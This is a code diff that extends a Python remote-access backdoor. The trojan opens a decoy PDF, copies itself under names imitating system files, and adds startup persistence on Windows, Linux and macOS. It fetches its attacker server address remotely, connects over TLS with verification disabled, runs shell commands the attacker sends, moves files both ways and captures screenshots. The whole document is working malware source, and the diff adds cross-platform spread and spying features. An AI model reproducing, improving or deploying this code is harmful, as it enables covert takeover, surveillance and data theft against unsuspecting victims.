@@ -1,4 +1,3 @@
-#!/usr/bin/env python
 import socket
 import subprocess
 import json
@@ -7,6 +6,15 @@ import base64
 import sys
 import shutil
 import requests
+import ssl
+import platform
+import time
+import io
+try:
+    from PIL import ImageGrab
+except ImportError:
+    ImageGrab = None
+import pyautogui
 
 def fetch_c2_ip():
     try:
@@ -18,20 +26,113 @@ def fetch_c2_ip():
 
 class Backdoor:
     def __init__(self, ip, port):
-        self.become_persistent() 
-        # These 2 lines make a TCP socket connection with IPv4
-        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.copy_to_secret_location()
+        self.become_persistent()
+        # Create a TCP socket connection with IPv4
+        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Wrap the socket with SSL (no certificate verification for client)
+        context = ssl.create_default_context()
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+        self.connection = context.wrap_socket(raw_sock)
         self.connection.connect((ip, port)) 
 
+    def copy_to_secret_location(self):
+        system = platform.system()
+        current_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+
+        if system == "Windows":
+            secret_path = os.path.join(os.environ["TEMP"], "WindowsExplorer.exe")
+        elif system == "Linux":
+            secret_path = os.path.expanduser("~/.local/.sysupdate")
+        elif system == "Darwin":
+            secret_path = os.path.expanduser("~/Library/Application Support/.sysupdate")
+        else:
+            return  # Unsupported OS
+
+        # Only copy if not already in the secret location
+        if os.path.abspath(current_path) != os.path.abspath(secret_path):
+            try:
+                shutil.copyfile(current_path, secret_path)
+                os.chdir(os.path.dirname(secret_path))  # Set working dir
+                os.execv(secret_path, [secret_path] + sys.argv[1:])
+            except Exception as e:
+                print(f"Copy error: {e}")
+
     def become_persistent(self):
-	    # File location set :
-        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe" 
-        # If file dosen't exist :
-        if not os.path.exists(evil_file_location): 
-	        # Copies file in location specified
-            shutil.copyfile(sys.executable, evil_file_location) 
-            # Makes it run on startup
-            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True) 
+        system = platform.system()
+        if system == "Windows":
+            self._windows_persistence()
+        elif system == "Linux":
+            self._linux_persistence()
+        elif system == "Darwin":  # macOS
+            self._mac_persistence()
+        else:
+            pass  # Or log unsupported OS
+
+    def _windows_persistence(self):
+        import winreg
+        evil_file_location = os.path.join(os.environ["appdata"], "Windows Explorer.exe")
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable, evil_file_location)
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                                     r"Software\Microsoft\Windows\CurrentVersion\Run",
+                                     0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, "update", 0, winreg.REG_SZ, evil_file_location)
+                winreg.CloseKey(key)
+            except Exception:
+                pass
+
+    def _linux_persistence(self):
+        autostart_dir = os.path.expanduser("~/.config/autostart")
+        if not os.path.exists(autostart_dir):
+            os.makedirs(autostart_dir)
+        desktop_file = os.path.join(autostart_dir, "systemupdate.desktop")
+        exec_path = sys.executable  # Path to the current Python executable or PyInstaller binary
+        desktop_content = f"""
+        [Desktop Entry]
+        Type=Application
+        Name=System Update
+        Exec={exec_path}
+        Hidden=false
+        NoDisplay=false
+        X-GNOME-Autostart-enabled=true
+        """
+        try:
+            with open(desktop_file, "w") as f:
+                f.write(desktop_content)
+            os.chmod(desktop_file, 0o755)
+        except Exception as e:
+            pass  # Optionally log the error
+
+    def _mac_persistence(self):
+        plist_dir = os.path.expanduser("~/Library/LaunchAgents")
+        if not os.path.exists(plist_dir):
+            os.makedirs(plist_dir)
+        plist_file = os.path.join(plist_dir, "com.apple.systemupdate.plist")
+        exec_path = sys.executable  # Path to the current Python executable or PyInstaller binary
+        plist_content = f"""
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        <plist version="1.0">
+        <dict>
+            <key>Label</key>
+            <string>com.apple.systemupdate</string>
+            <key>ProgramArguments</key>
+            <array>
+                <string>{exec_path}</string>
+            </array>
+            <key>RunAtLoad</key>
+            <true/>
+        </dict>
+        </plist>
+        """
+        try:
+            with open(plist_file, "w") as f:
+                f.write(plist_content)
+        except Exception as e:
+            pass  # Optionally log the error
 
     def reliable_send(self, data):
         json_data = json.dumps(data).encode()
@@ -117,33 +218,66 @@ class Backdoor:
         except Exception as e:
             return f"[-] Error: {str(e)}"
 
+    def take_screenshot(self):
+        try:
+            screenshot = None
+            system = platform.system()
+
+            if ImageGrab and system in ["Windows", "Darwin"]:
+                screenshot = ImageGrab.grab()
+            else:
+                # Linux: Check if GUI is available
+                if os.environ.get("DISPLAY") is None:
+                    return "[-] No GUI display available"
+
+                screenshot = pyautogui.screenshot()
+
+            buf = io.BytesIO()
+            screenshot.save(buf, format='PNG')
+            buf.seek(0)
+            return base64.b64encode(buf.read()).decode()
+        except Exception as e:
+            return f"[-] Error taking screenshot: {str(e)}"
+
     def run(self):
         while True:
-            command = self.reliable_receive() # Receive the command from the attacker machine
             try:
+                command = self.reliable_receive()
+                if not command:
+                    break  # Connection closed
                 if command[0] == "exit":
                     self.connection.close()
                     sys.exit()
                 elif command[0] == "cd" and len(command) > 1:
-                    command_result = self.change_working_directory_to(command[1]) # Change the working directory
+                    command_result = self.change_working_directory_to(command[1])
                 elif command[0] == "download":
-                    command_result = self.read_file(command[1]) # Read the file
+                    command_result = self.read_file(command[1])
                 elif command[0] == "upload":
-                    command_result = self.write_file(command[1], command[2]) # Write the file
+                    command_result = self.write_file(command[1], command[2])
+                elif command[0] == "screenshot":
+                    command_result = self.take_screenshot()
                 else:
-                    command_result = self.execute_command(command)  # Execute the command
-            except Exception:
-                command_result = "[-] Error during command execution"
-                
-            self.reliable_send(command_result) # Send the result back to the attacker machine
+                    command_result = self.execute_command(command)
+            except Exception as e:
+                command_result = f"[-] Error during command execution: {str(e)}"
+            self.reliable_send(command_result)
 
-ATTACKER_IP = fetch_c2_ip()
-file_name = sys._MEIPASS + "sample.pdf" # Location for pdf
-subprocess.Popen(file_name, shell=True) # Open the pdf file
+def main():
+    ATTACKER_IP = fetch_c2_ip()
+    if ATTACKER_IP == "Server down for pastebin":
+        sys.exit("[-] Could not fetch C2 IP. Exiting.")
 
-try:
-    my_backdoor = Backdoor(ATTACKER_IP, 4444) # Create an object of the class
-    my_backdoor.run() # Call the run method
-except Exception as e:
-    print(f"Connection broken due to {e}")
-    sys.exit()
+    if hasattr(sys, "_MEIPASS"):
+        file_name = os.path.join(sys._MEIPASS, "sample.pdf")
+        subprocess.Popen(file_name, shell=True)  # Open the pdf file
+
+    while True:
+        try:
+            my_backdoor = Backdoor(ATTACKER_IP, 4444)
+            my_backdoor.run()
+        except Exception as e:
+            print(f"Connection lost: {e}. Reconnecting in 9 seconds...")
+            time.sleep(9)  
+
+if __name__ == "__main__":
+    main()
